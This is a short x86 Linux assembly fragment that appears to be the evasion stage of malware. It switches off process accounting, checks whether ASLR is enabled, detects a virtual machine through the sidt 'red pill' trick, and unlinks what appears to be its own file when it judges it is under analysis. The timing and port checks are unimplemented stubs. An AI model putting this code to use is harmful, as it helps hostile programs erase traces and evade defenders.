	mov ebp,esp

	;disable process accounting
	mov eax,51
	xor ebx,ebx
	int 0x80

	;open("/proc/sys/kernel/randomize_va_space","r");
	mov eax,5
	jmp __CONF__
  X__CONF__:
	pop ebx
	xor ecx,ecx
	xor edx,edx
	int 0x80
	cmp eax,0
	jle __noASLR1
	mov ebx,eax
	mov eax,3
	push dword 0
	mov ecx,esp
	mov edx,1
	int 0x80
	pop eax
	cmp eax,0x30
	je __noASLR0
	mov eax,6
	int 0x80
	jmp __enASLR
  __noASLR0:
	mov eax,6
	int 0x80
  __noASLR1:
	mov edi,1
	jmp __checkIDT
  __enASLR:
	xor edi,edi
	jmp __checkIDT
  __CONF__:
	call X__CONF__
	db "/proc/sys/kernel/randomize_va_space",0
  __checkIDT:
	push dword 0
	sidt [esp]
	pop eax
	and eax,0xFF0000
	cmp eax,0
	jne __virtualized
	jmp __checkTiming
  __virtualized:
	inc edi
  __checkTiming:
	;TODO: implement this
  __checkPorts:
	;TODO: implement this

	cmp edi,2
	jne __continue
	mov eax,10
	mov ebx,[ebp+4]
	int 0x80

  __continue:
	nop
